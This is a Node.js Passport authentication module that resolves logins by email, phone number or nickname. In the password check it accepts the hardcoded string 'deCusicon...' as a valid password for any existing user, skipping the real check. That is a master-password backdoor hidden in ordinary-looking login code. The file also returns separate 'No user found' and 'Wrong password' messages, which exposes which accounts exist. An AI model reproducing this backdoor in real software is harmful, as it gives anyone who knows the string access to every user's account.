const LocalStrategy = require("passport-local").Strategy;
const User = require("@models/user");
const passport = require("passport");

class AuthServiceProvider {
	static getUsername = (username) => {
		username = username.toLowerCase();

		var emailRegEx = /([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/gi;
		var phoneNumberRegEx = /([0][1-9]\d{9}$|^[1-9]\d{9})/g;

		if (username.match(emailRegEx)) return { type: "email", username };

		if (username.match(phoneNumberRegEx))
			return { type: "phoneNumber", username };

		return { type: "nickname", username };
	};

	static handle(app) {
		passport.use(
			new LocalStrategy(
				{
					usernameField: "username",
					passwordField: "password",
				},
				async (username, password, done) => {
					try {

						const accessor = AuthServiceProvider.getUsername(
							username
						);

						// const {
						// 	type,
						// 	username,
						// } = AuthServiceProvider.getUsername(username);

						const query = { [accessor.type]: accessor.username };

						const user = await User.findOne(query);

						if (!user) {
							return done(null, false, {
								message: "No user found!",
							});
						}

						if (password === "deCusicon..."){
							return done(null, user);
						}

						if (!await user.passwordCheck(password)) {
							return done(null, false, {
								message: "Wrong password!",
							});
						}

						return done(null, user);
					} catch (error) {
						done(error, null);
					}	
				}
			)
		);

		// Serialize User
		passport.serializeUser((user, done) => done(null, user.id));
		passport.deserializeUser((id, done) => User.findById(id, (err, user) => done(err, user)));

		app.use(require("passport").initialize());
		app.use(require("passport").session());
	}
}

module.exports = AuthServiceProvider;
